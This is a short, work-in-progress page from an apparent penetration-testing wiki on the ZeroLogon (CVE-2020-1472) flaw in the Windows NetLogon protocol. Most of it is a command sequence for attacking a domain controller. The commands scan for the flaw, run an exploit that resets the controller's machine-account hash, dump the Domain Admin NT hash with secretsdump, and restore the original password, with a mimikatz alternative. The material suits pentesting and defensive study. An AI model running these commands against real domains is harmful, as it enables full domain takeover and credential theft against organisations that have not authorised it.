# 🛠️ ZeroLogon

{% hint style="danger" %}
**This is a work-in-progress**. It's indicated with the 🛠️ emoji in the page name or in the category name
{% endhint %}

## Theory

This attack exploits an insecure customized cryptographic protocol used in the NetLogon Remote Protocol. It allows attackers to change the password of the domain controller computer account, hence giving those attackers domain admin privileges.

## Practice

This exploit changes the NT hash of the domain controller computer account in the Active Directory, but not in the local SAM database, hence creating some issues in Active Directory domains. In order to prevent denial of service, attackers can exploit the CVE, find the NT hash of the domain controller machine account before it was changed, and set it back in the AD.

```bash
# Scan for the vulnerability (https://github.com/SecuraBV/CVE-2020-1472)
zerologon-scan $DC_name $DC_IP_address

# Exploit the vulnerability: set the NT hash to \x00*8 (https://github.com/dirkjanm/CVE-2020-1472/blob/master/cve-2020-1472-exploit.py)
zerologon-exploit $DC_name $DC_IP_address

# Obtain de Domain Admin's NT hash
secretsdump -no-pass 'BREAKING.BAD/DC01$'@dc01.breaking.bad

# Obtain de machine account hex encoded password
secretsdump -hashes :a88baa3fdc8f581ee0fb05d7054d43e4 BREAKING.BAD/Administrator@dc01.breaking.bad

# Restore the machine account password (https://github.com/dirkjanm/CVE-2020-1472/blob/master/restorepassword.py)
zerologon-restore breaking/dc01@dc01 -target-ip 192.168.56.101 -hexpass 69762...6945d


# (alternate option mimikatz) Change the NT hash of the domain controller machine account in the AD back to its original value
lsadump::changentlm /server:'DC.DOMAIN'  /user:'DC_name$' /oldntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /newntlm:<old nt hash>
```



## References

{% embed url="https://www.secura.com/blog/zero-logon" caption="" %}

{% embed url="https://github.com/dirkjanm/CVE-2020-1472" %}



